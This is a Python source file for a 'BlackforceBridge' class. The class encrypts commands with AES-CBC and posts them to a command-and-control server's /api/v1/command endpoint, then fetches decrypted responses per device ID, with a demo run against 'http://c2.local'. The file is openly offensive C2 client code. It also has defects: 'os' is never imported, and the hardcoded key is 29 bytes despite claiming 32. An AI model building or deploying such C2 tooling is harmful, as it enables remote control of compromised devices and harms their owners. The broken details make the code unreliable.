import json
import logging
import base64
import hashlib
import hmac
from typing import Dict, Any, Optional

logger = logging.getLogger(__name__)

class CryptoUtils:
    @staticmethod
    def encrypt(data: bytes, key: bytes) -> bytes:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.primitives import padding
        from cryptography.hazmat.backends import default_backend
        iv = os.urandom(16)
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        padder = padding.PKCS7(128).padder()
        padded = padder.update(data) + padder.finalize()
        ct = encryptor.update(padded) + encryptor.finalize()
        return iv + ct

    @staticmethod
    def decrypt(data: bytes, key: bytes) -> bytes:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.primitives import padding
        from cryptography.hazmat.backends import default_backend
        iv = data[:16]
        ct = data[16:]
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        padded = decryptor.update(ct) + decryptor.finalize()
        unpadder = padding.PKCS7(128).unpadder()
        return unpadder.update(padded) + unpadder.finalize()

class NetworkManager:
    def __init__(self):
        import requests
        self.session = requests.Session()

    def send_post(self, url: str, data: Any, headers: Optional[Dict] = None) -> Any:
        import requests
        try:
            resp = self.session.post(url, json=data, headers=headers, timeout=10)
            return resp
        except Exception as e:
            logger.error(f"Network error: {e}")
            return None

class BlackforceBridge:
    def __init__(self, c2_url: str, shared_key: bytes):
        self.c2_url = c2_url.rstrip('/')
        self.shared_key = shared_key
        self.net = NetworkManager()
        self.crypto = CryptoUtils()

    def transmit_command(self, command_data: Dict) -> bool:
        try:
            logger.info("encrypting and transmitting command")
            serialized = json.dumps(command_data).encode()
            encrypted = self.crypto.encrypt(serialized, self.shared_key)
            b64_enc = base64.b64encode(encrypted).decode()
            payload = {"payload": b64_enc}
            resp = self.net.send_post(f"{self.c2_url}/api/v1/command", payload)
            if resp and resp.status_code == 200:
                logger.info("command transmitted successfully")
                return True
            logger.error(f"transmission failed: {getattr(resp, 'status_code', 'no response')}")
            return False
        except Exception as e:
            logger.error(f"error in transmit_command: {e}")
            return False

    def receive_response(self, device_id: str) -> Optional[Dict]:
        try:
            url = f"{self.c2_url}/api/v1/response/{device_id}"
            resp = self.net.send_post(url, {})
            if resp and resp.status_code == 200:
                data = resp.json()
                enc = base64.b64decode(data.get("payload", ""))
                dec = self.crypto.decrypt(enc, self.shared_key)
                return json.loads(dec.decode())
            return None
        except Exception as e:
            logger.error(f"error receiving response: {e}")
            return None

if __name__ == "__main__":
    bridge = BlackforceBridge("http://c2.local", b"32bytekeyforaes256mustbeexact")
    cmd = {"action": "ping", "params": {}}
    bridge.transmit_command(cmd)